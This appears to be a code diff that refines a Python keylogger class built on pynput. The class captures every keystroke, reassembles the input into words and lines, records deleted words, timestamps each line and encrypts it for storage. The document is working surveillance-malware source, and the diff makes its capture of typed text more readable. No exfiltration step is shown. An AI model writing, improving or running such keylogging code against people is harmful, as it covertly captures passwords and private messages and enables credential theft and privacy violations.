@@ -1,31 +1,69 @@
 from pynput import keyboard
 from datetime import datetime
-import socket
 from encryptor import Encryptor
 
 class KeyloggerService:
     def __init__(self):
-        self.logged_keys = []
-        self.computer_name = socket.gethostname()
+        self.current_line = ""
+        self.current_word = ""
+        self.logged_lines = []
+        self.listener = None
 
     def _on_press(self, key):
         try:
             char = key.char
         except AttributeError:
-            char = f"<{key.name}>"
+            if key == keyboard.Key.space:
+                char = " "
+            elif key == keyboard.Key.enter:
+                char = "\n"
+            elif key == keyboard.Key.backspace:
+                char = "<backspace>"
+            else:
+                return
 
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        log_line = f"{timestamp} | {self.computer_name} | {char}"
-        encrypted_log = Encryptor.encrypt(log_line)
-        self.logged_keys.append(encrypted_log)
+        if char == "<backspace>":
+            if self.current_word:
+                removed_word = self.current_word
+                self.current_word = ""
+                self.current_line = self.current_line.rstrip()
+                self.current_line += f"(מחיקה של: {removed_word}) "
+            else:
+                self.current_line = self.current_line.rstrip()
+        elif char == " ":
+            self.current_line += self.current_word + " "
+            self.current_word = ""
+        elif char == "\n":
+            if self.current_word:
+                self.current_line += self.current_word
+                self.current_word = ""
+            if self.current_line.strip():
+                timestamp = datetime.now().strftime("%H:%M")
+                log_line = f"{timestamp} | {self.current_line.strip()}"
+                encrypted_log = Encryptor.encrypt(log_line)
+                self.logged_lines.append(encrypted_log)
+            self.current_line = ""
+        else:
+            self.current_word += char
 
     def start_logging(self):
+        if self.listener and self.listener.running:
+            return
         self.listener = keyboard.Listener(on_press=self._on_press)
         self.listener.start()
 
     def stop_logging(self):
-        if hasattr(self, 'listener'):
+        if self.listener and self.listener.running:
             self.listener.stop()
+        if self.current_word:
+            self.current_line += self.current_word
+            self.current_word = ""
+        if self.current_line.strip():
+            timestamp = datetime.now().strftime("%H:%M")
+            log_line = f"{timestamp} | {self.current_line.strip()}"
+            encrypted_log = Encryptor.encrypt(log_line)
+            self.logged_lines.append(encrypted_log)
+            self.current_line = ""
 
-    def get_logged_keys(self):
-        return self.logged_keys
+    def get_logged_lines(self):
+        return self.logged_lines
